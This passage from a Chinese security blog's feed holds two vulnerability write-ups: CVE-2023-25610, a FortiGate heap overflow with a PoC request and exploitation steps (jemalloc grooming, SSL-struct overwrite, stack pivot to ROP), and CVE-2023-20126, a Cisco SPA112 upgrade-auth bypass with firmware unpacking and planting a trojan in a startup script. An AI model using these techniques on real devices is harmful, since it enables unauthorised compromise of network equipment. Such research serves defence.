class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v10 = v8 + <span class="number">1</span>;</span><br><span class="line">              v11 = apr_palloc(*a1, v10);</span><br><span class="line">              v12 = v10;</span><br><span class="line">              v13 = <span class="number">0</span>;</span><br><span class="line">              v14 = <span class="built_in">memset</span>(v11, <span class="number">0</span>, v12);</span><br><span class="line">              *a2 = v14;</span><br><span class="line">              <span class="keyword">for</span> ( i = v14; ; i = *a2 )</span><br><span class="line">              &#123;</span><br><span class="line">                v16 = ap_get_client_block(a1, &amp;i[v13], v9 - v13);</span><br><span class="line">                <span class="keyword">if</span> ( v16 &lt;= <span class="number">0</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                v13 += v16;</span><br><span class="line">                <span class="keyword">if</span> ( v13 &lt;= v9 )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( v13 &gt; v18 )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  v13 = v9;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( a3 )</span><br><span class="line">                *a3 = v13;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">500</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>经过分析确认，此函数用来处理 POST 请求体数据。我们看到它发生了显著变化，新版中添加了一系列大小检查。</p>
<p>那么问题出现在哪里呢？函数中 <code>a1 + 216</code> 变量对应 apache request_rec 结构中的 remaining 成员(可能)，表示 body 中还剩余的数据长度。代码获取到这个值(v5)，并分配 v5 + 1 大小的内存(记为 heap_start)供后续使用。</p>
<p>随后进入循环，调用 ap_get_client_block 函数每次从请求中获取 0x2000 大小的数据块，将它拷贝到 heap_start 。这里注意到存在一个 int 类型变量 v3，汇编对应 32 位寄存器。循环中不断对它进行累加操作，但循环的边界依靠 int64 类型变量来判断，所以当传入了较多的数据时，变量 v3 将发生整数溢出，回绕成一个<strong>负数</strong>。</p>
<p>当 v3 变成负数时，代码继续调用 memcpy 尝试将数据块拷贝到堆内存。此时新的目的地址变成 heap_start 减去某值，数据将被拷贝到 heap_start 的低地址方向，可能导致未定义的行为。</p>
<p>根据以上分析，想要让 v3 发生整数溢出，至少要在请求体中构造 2GB 的数据。这一点可能难以实现，本文暂不做进一步讨论。</p>
<p>FortiGate 有几个不同的版本系列，而这个漏洞在不同版本中的形态不同，我们以 6.0.x 为例再次分析。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">util_read</span><span class="params">(_QWORD *a1, _QWORD *a2, _DWORD *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// er15</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// er13</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+18h] [rbp-2048h]</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">8200</span>]; <span class="comment">// [rsp+20h] [rbp-2040h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+2028h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v11 = a1[<span class="number">26</span>];</span><br><span class="line">  *a2 = sub_CC3750(*a1, (<span class="type">unsigned</span> <span class="type">int</span>)(v11 + <span class="number">1</span>));</span><br><span class="line">  sub_CDB860(<span class="string">&quot;[libapreq] util_read&quot;</span>, a1);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = sub_CE2BA0(a1, src, <span class="number">0x2000</span>LL);</span><br><span class="line">    v6 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = v4 + v8;</span><br><span class="line">    sub_CDB770(a1);</span><br><span class="line">    <span class="keyword">if</span> ( v11 &lt; v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v11 - v4;</span><br><span class="line">      v5 = v11;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = (<span class="type">void</span> *)(*a2 + v4);</span><br><span class="line">    v4 = v5;</span><br><span class="line">    <span class="built_in">memcpy</span>(v7, src, v6);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_CDB8B0(a1);</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">    *a3 = v4;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>逻辑和 7.x 大体相同，但是存在几个关键差异。首先分配内存时不使用 remaining 字段，而是直接使用 Content-Length 的值。第二，alloc 执行 + 1 操作时会将 __int64 类型变量强制转换为 unsigned int 类型，存在整数溢出，这一点和历史漏洞 CVE-2022-42475 相似。</p>
<p>我们构造较大的 Content-Length 值，在 alloc 时发生 int 溢出截断，导致分配了较小的内存空间，而后续循环拷贝数据时又使用了较大的 CL 值，最终将导致堆内存溢出。</p>
<h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p><strong>感谢”天空之城”分享了在复现该漏洞时遇到的一些问题。</strong></p>
<ol>
<li>本文提及的利用分析基于 TLSv1.3，在其他 TLS 版本上可能存在差异。</li>
<li>如果使用脚本和服务进行交互，需要注意 openssl 版本问题，比如 python 建议使用 3.11 以上版本。</li>
</ol>
<p>首先来构造一个可以触发漏洞的 PoC，根据之前的分析，在 POST 请求中伪造一个较大的 Content-Length 值，然后在请求体中填充随机数据，例如</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: 192.168.232.151</span><br><span class="line">Content-Length: 4296015872</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;random_long_data&gt;</span><br></pre></td></tr></table></figure></div>

<p>在 httpsd 进程上挂载调试器，然后发送请求，得到以下结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-1.png"
                     
                ></p>
<p>段错误导致程序崩溃，观察崩溃的地址，rdi 是一个越界的堆地址，通过查看栈回溯地址，崩溃就发生在 util_read 的 memcpy 位置，拷贝数据时目的地址已经越界。</p>
<p>根据以往的 sslvpn 利用经验，我们可以通过堆溢出覆盖请求的 SSL 结构体，控制函数指针来劫持程序流程。但是 SSL 结构体通常被分配在 0x7f 开头的高地址，而发生越界的位置在较低地址，无法直接覆盖 SSL 结构。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-2.png"
                     
                ></p>
<p>参考历史资料发现，fortios 中内存分配部分使用了 jemalloc，这种内存管理策略中包含地址重用以及针对较大的分配请求重新映射一块内存等机制。</p>
<p>在 PoC 中我们构造的 CL 值为 0x100100000，分配的内存位于低地址，我们尝试扩大 CL 值，看看能否将内存分配到 0x7f 的高地址。</p>
<p>经过测试，当 CL 等于 0x100821000 时，SSL 结构体地址：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-3.png"
                     
                ></p>
<p>发生崩溃时的状态：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-4.png"
                     
                ></p>
<p>此时数据被拷贝到 0x7f 的高地址，对应内存布局：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-5.png"
                     
                ></p>
<p>这样可控的数据恰好位于 SSL 结构体之上且两个内存块之间不存在间隙，可以通过溢出去覆盖其内部变量。</p>
<p>我们观察到 SSL 结构体地址是 0x7f5aee9b8000，而内存块起始地址为 0x7f5aee800000，两者之间还存在大小为 0x1b8000 的其他数据，再查看栈回溯信息和崩溃现场，代码尝试从 0x9e9f1df98d3a1000 地址取值，这显然不是一个正常地址，看起来像经过某种运算后得到的指针。</p>
<p>尝试修改发送的请求数据，发现这个值和我们的输入有关，并且根据 jemalloc 内存管理算法确定，SSL 结构体之上的数据可能是 jemalloc 中的一些关键变量。</p>
<p>当发送某特定值时，可以让以上计算得到一个合法的地址，防止非法地址访问崩溃。在填充到 SSL 结构体之前的数据中还存在数个类似的地址计算过程，依次布置好相关数据就能绕过。</p>
<p>接着覆盖 SSL 结构体，尝试在其中填充随机数据得到以下崩溃：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-6.png"
                     
                ></p>
<p>在对应位置填充一个合法地址，继续执行：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-7.png"
                     
                ></p>
<p>代码用 EVP_CIPHER_flags 函数取值并 call rax 跳转到对应位置。如果可以找到一个合适的目标地址，就能劫持控制流来执行进一步利用。</p>
<p>所谓合适的目标地址，即能否利用程序中的代码片段，将栈迁移到可控内存，构造 ROP 链完成后续利用。在 init 程序中存在一个叫做 ENGINE_ctrl  的函数，其内容如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-8.png"
                     
                ></p>
<p>此函数会从参数中获取一些变量，判断之后将取出的值作为函数指针去调用。这个函数地址位于 GOT 表中，且查看 call rax 时寄存器状态发现第一个参数的地址中包含可控数据。我们将 EVP_CIPHER_flags 的地址指向 ENGINE_ctrl  函数，这样就可以将一个只能部分控制程序执行流的情况转变成了完全控制程序执行流。</p>
<p>当执行指针跳转时 RBP 寄存器恰好指向我们可控的数据，这里利用 push_rbp_pop_rsp 实现栈迁移，迁移之后就可以按照常规思路进行 ROP 完成利用。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a class="link"   href="https://www.fortiguard.com/psirt/FG-IR-23-001" >https://www.fortiguard.com/psirt/FG-IR-23-001<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://wanghenshui.github.io/2019/05/01/jemalloc.html" >https://wanghenshui.github.io/2019/05/01/jemalloc.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>Cisco SPA112 固件解包/打包分析</title>
    <url>/2023/05/12/spa112/</url>
    <content><![CDATA[<p>SPA112 是 Cisco 早期推出的一款语音网关，2023 年 5 月 3 日，Cisco 官方发布了关于此设备的漏洞 CVE-2023-20126，本文对此漏洞进行分析。</p>
<span id="more"></span>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>可以在 Cisco <a class="link"   href="https://software.cisco.com/download/home/283998771/type/282463187/release/1.4.1%20SR5" >官方网站<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>下载到该设备的固件，当前最新版为 1.4.1 SR5 (已停止维护)。</p>
<p>直接使用 binwalk 解压，解压后得到一个 squashfs 文件系统。</p>
<p>该漏洞比较简单，出现在 web 服务中。关键文件为 &#x2F;usr&#x2F;sbin&#x2F;httpd，我们使用 IDA 逆向分析，找到请求处理的主要部分</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v114 = uri_handler[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> ( !uri_handler[<span class="number">0</span>] )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_113;</span><br><span class="line">v115 = uri_handler;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( kk = v114; ; kk = v117 + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v117 = <span class="built_in">strchr</span>(kk, <span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v117 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( match(kk, v117 - kk, v39) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">  &#125;</span><br><span class="line">  v118 = <span class="built_in">strlen</span>(kk);</span><br><span class="line">  <span class="keyword">if</span> ( !match(kk, v118, v39) )</span><br><span class="line">  &#123;</span><br><span class="line">    v119 = v115[<span class="number">6</span>];</span><br><span class="line">    v115 += <span class="number">6</span>;</span><br><span class="line">    v114 = v119;</span><br><span class="line">    <span class="keyword">if</span> ( v119 )</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_113;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">LABEL_98:</span><br><span class="line">is_need_auth = v115[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">if</span> ( is_need_auth )</span><br><span class="line">&#123;</span><br><span class="line">  (is_need_auth)(&amp;unk_625F4, &amp;unk_62634, &amp;unk_62674);</span><br><span class="line">  dword_623D4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v39, <span class="string">&quot;login.asp&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !sub_11120(v39) )</span><br><span class="line">    &#123;</span><br><span class="line">      v156 = dword_64EA4;</span><br><span class="line">      <span class="keyword">if</span> ( dword_64EA4 || sub_10340() &gt;= <span class="number">0</span> )</span><br><span class="line">        v39 = <span class="string">&quot;login.asp&quot;</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        sub_119FC(<span class="number">403</span>, <span class="string">&quot;Forbidden&quot;</span>, v156, <span class="string">&quot;Can&#x27;t use wireless interface to access web.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">dword_6DD10 = <span class="number">0</span>;</span><br><span class="line">v37 = strcasecmp(s, <span class="string">&quot;post&quot;</span>);</span><br><span class="line">cgi_handler = v115[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">if</span> ( !v37 )</span><br><span class="line">  dword_6DD10 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( cgi_handler )</span><br><span class="line">&#123;</span><br><span class="line">  (cgi_handler)(v39, dword_625F0, v173, v51);</span><br><span class="line">  <span class="keyword">if</span> ( !dword_623C8 )</span><br><span class="line">  &#123;</span><br><span class="line">    v157 = fileno(dword_625F0);</span><br><span class="line">    v158 = fcntl(v157, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v158 != <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v159 = fileno(dword_625F0);</span><br><span class="line">      <span class="keyword">if</span> ( fcntl(v159, <span class="number">4</span>, v158 | <span class="number">0x800</span>) != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( fgetc(dword_625F0) != <span class="number">-1</span> )</span><br><span class="line">          fgetc(dword_625F0);</span><br><span class="line">        v160 = fileno(dword_625F0);</span><br><span class="line">        fcntl(v160, <span class="number">4</span>, v158);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这部分逻辑和一些开源 web 服务相似，通过将请求 URI 和程序中一个数组相比较，取出相同条目的函数指针调用。列表中的每个项目第 1 个成员是 uri 字符串，第 4 个成员是 handler 函数指针，第 6 个成员表示该 CGI 接口是否需要身份验证。</p>
<p>统计所有接口，我们发现在无需授权的接口中，包含一个叫做 upgrade.cgi 的接口，对应 handler 如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">upgrade_handler</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">bool</span> v8; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// r3</span></span><br><span class="line">  FILE *v16; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [sp+Ch] [bp-42Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [sp+17h] [bp-421h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [sp+18h] [bp-420h]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [sp+19h] [bp-41Fh]</span></span><br><span class="line"></span><br><span class="line">  v18 = a3;</span><br><span class="line">  dword_64EA8 = <span class="number">22</span>;</span><br><span class="line">  system(<span class="string">&quot;cp /www/Success_u.asp /tmp/.&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cp /www/Fail_r_s.asp /tmp/.&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cp /www/Success_u_s.asp /tmp/.&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cp /www/Fail_u_s.asp /tmp/.&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cp /sbin/write /tmp/write&quot;</span>);</span><br><span class="line">  v6 = v18;</span><br><span class="line">  <span class="keyword">if</span> ( v18 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v6 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (v6 + <span class="number">1</span>) &gt;= <span class="number">0x400</span> )</span><br><span class="line">        v7 = <span class="number">1024</span>;</span><br><span class="line">      v8 = sub_108E0(&amp;v19, v7, a2) == <span class="number">0</span>;</span><br><span class="line">      result = &amp;v19;</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      v9 = v18 - <span class="built_in">strlen</span>(&amp;v19);</span><br><span class="line">      v18 = v9;</span><br><span class="line">      v6 = v9;</span><br><span class="line">      <span class="keyword">if</span> ( !strncasecmp(&amp;v19, <span class="string">&quot;Content-Disposition:&quot;</span>, <span class="number">0x14</span>u) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(&amp;v19, <span class="string">&quot;name=\&quot;file\&quot;&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          dword_84190 = <span class="number">1</span>;</span><br><span class="line">          nvram_set(<span class="string">&quot;submit_button&quot;</span>, <span class="string">&quot;Upgrade&quot;</span>);</span><br><span class="line">          v17 = <span class="number">2</span>;</span><br><span class="line">LABEL_14:</span><br><span class="line">          <span class="keyword">if</span> ( !nvram_match(<span class="string">&quot;submit_button&quot;</span>, <span class="string">&quot;Upgrade&quot;</span>)</span><br><span class="line">            || (dword_5DED4 = <span class="number">257</span>, dword_6DD88)</span><br><span class="line">            || nvram_match(<span class="string">&quot;remote_upgrade&quot;</span>, &amp;byte_4B814)</span><br><span class="line">            || !nvram_match(<span class="string">&quot;router_mode&quot;</span>, &amp;byte_4B814) )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = v18;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v12 = v11 + <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v11 &lt;= <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">LABEL_25:</span><br><span class="line">                v13 = sub_1E048(<span class="number">0</span>, a2, &amp;v18, v17, a4);</span><br><span class="line">                v14 = v18;</span><br><span class="line">                dword_64EA8 = v13;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( v12 &gt;= <span class="number">0x400</span> )</span><br><span class="line">                v12 = <span class="number">1024</span>;</span><br><span class="line">              v8 = sub_108E0(&amp;v19, v12, a2) == <span class="number">0</span>;</span><br><span class="line">              result = &amp;v19;</span><br><span class="line">              <span class="keyword">if</span> ( v8 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v11 = v18 - <span class="built_in">strlen</span>(&amp;v19);</span><br><span class="line">              v18 = v11;</span><br><span class="line">              <span class="keyword">if</span> ( v19 == <span class="number">10</span> &amp;&amp; !v20 || v19 == <span class="number">13</span> &amp;&amp; v20 == <span class="number">10</span> &amp;&amp; !v21 )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v16 = fopen(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v16 )</span><br><span class="line">            &#123;</span><br><span class="line">              fwrite(<span class="string">&quot;Can&#x27;t upgrade from wan side\n&quot;</span>, <span class="number">1u</span>, <span class="number">0x1C</span>u, v16);</span><br><span class="line">              fclose(v16);</span><br><span class="line">            &#125;</span><br><span class="line">            v14 = v18;</span><br><span class="line">            dword_64EA8 = <span class="number">99</span>;</span><br><span class="line">LABEL_26:</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              result = a2;</span><br><span class="line">              v15 = a2;</span><br><span class="line">              <span class="keyword">if</span> ( v14 &lt;= <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">while</span> ( dword_623C8 )</span><br><span class="line">              &#123;</span><br><span class="line">                BIO_gets(result, &amp;v19, <span class="number">1</span>, v15);</span><br><span class="line">                result = a2;</span><br><span class="line">                v15 = a2;</span><br><span class="line">                <span class="keyword">if</span> ( v18 &lt;= <span class="number">0</span> )</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">              &#125;</span><br><span class="line">              result = sub_10548(&amp;v19, <span class="number">1</span>, <span class="number">1025</span>, v15);</span><br><span class="line">              <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">              v14 = v18 - result;</span><br><span class="line">              v18 -= result;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(&amp;v19, <span class="string">&quot;name=\&quot;restore\&quot;&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          dword_623AC = <span class="number">1</span>;</span><br><span class="line">          nvram_set(<span class="string">&quot;submit_button&quot;</span>, <span class="string">&quot;Restore&quot;</span>);</span><br><span class="line">          v17 = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v17 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;\n Fail: upgrade file size = %d \n&quot;</span>, v18);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个接口负责对设备进行固件升级，代码会尝试获取 Content-Disposition 请求参数，判断其中的 name 为 file 还是 restore。当 name 为 file 时，代码设置 submit_button 变量为 Upgrade，在后续的 if 条件判断中，会检查 submit_button 变量，如果它等于 Upgrade，则继续判断 remote_upgrade 等参数值。这样的目的是为了防止用户从 WAN 端执行固件升级操作。</p>
<p>观察逻辑，当 name 等于 Restore 时，代码设置 submit_button 等于 Restore，之后回到 if 判断，此时 nvram_match 函数返回 0，第一条逻辑成立，则会跳过后续判断进入 if 语句，随后调用 sub_1E048 函数，开始升级系统。</p>
<p>因此，没有经过授权的用户可以尝试构造一个恶意的固件文件，利用这个接口上传到设备，当升级完成之后新的系统中就会包含攻击者控制的木马程序。</p>
<h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>该漏洞原理比较简单，但是想利用却要花费一些心思。因为需要知道合法的固件格式，以及如何正确解包和打包。</p>
<p>我们首先来分析一下设备的固件格式，查看 binwalk 解析结果：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">392           0x188           uImage header, header size: 64 bytes, header CRC: 0xF534C9EA, created: 2106-02-07 06:28:15, image size: 1572736 bytes, Data Address: 0x20008000, Entry Point: 0x20008000, data CRC: 0xE6D5E563, OS: Linux, CPU: ARM, image type: OS Kernel Image, compression type: none, image name: &quot;SP2Xcybertan_rom_bin&quot;</span><br><span class="line">456           0x1C8           Linux kernel ARM boot executable zImage (little-endian)</span><br><span class="line">13596         0x351C          gzip compressed data, maximum compression, from Unix, last modified: 2019-10-14 04:38:56</span><br><span class="line">1573192       0x180148        uImage header, header size: 64 bytes, header CRC: 0x96353C43, created: 2106-02-07 06:28:15, image size: 8478720 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0x96855278, OS: Linux, CPU: ARM, image type: Filesystem Image, compression type: none, image name: &quot;SP2Xcybertan_rom_bin&quot;</span><br><span class="line">1573256       0x180188        Squashfs filesystem, little endian, non-standard signature, version 3.1, size: 8476193 bytes, 1028 inodes, blocksize: 131072 bytes, created: 2019-10-14 04:51:02</span><br></pre></td></tr></table></figure></div>

<p>固件中主要包含 Linux 内核以及 squashfs 文件系统两部分，考虑到希望植入木马程序，内核部分可以略过，所以主要关注点应放在 Squashfs filesystem 上面。</p>
<p>使用以下命令将文件系统切割出来：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd if=ori.bin of=sqfs.ori bs=1 skip=1573256</span><br></pre></td></tr></table></figure></div>

<p>按照常规思路，接下来我们可以使用 unsquashfs 工具解压 sqfs.ori，但是直接解压会提示错误：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">FATAL ERROR: Can&#x27;t find a valid SQUASHFS superblock on ./sqfs.ori</span><br></pre></td></tr></table></figure></div>

<p>由于 unsquashfs  等 sqfs 工具是开源的，猜测厂商可能将这部分代码做了修改。如果想要正常解压以及打包，那么就要找出修改了哪些部分，想办法还原相关逻辑。</p>
<p>幸运的是 Cisco <a class="link"   href="https://www.cisco.com/web/fw/opensource/64846727/payton_1.3.5.001_gpl-28.tar.gz" >官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>上保留了该设备的 GPL 代码包，其中就包含修改过的 sqfs 工具。我们下载这套代码，将其中的 squashfs 相关工具编译出来，使用这些工具即可正常对文件进行解包(binwalk 可以正常解包，应该是 binwalk 内部进行了特殊支持)。</p>
<p>解包后需要找到一个位置植入木马文件，通常我们会寻找一些开机自启动的脚本，在其中添加执行木马的命令。在这个系统中，可以修改 &#x2F;etc&#x2F;rc.init.1 文件，系统启动后会自动执行。</p>
<p>修改之后的样例：</p>
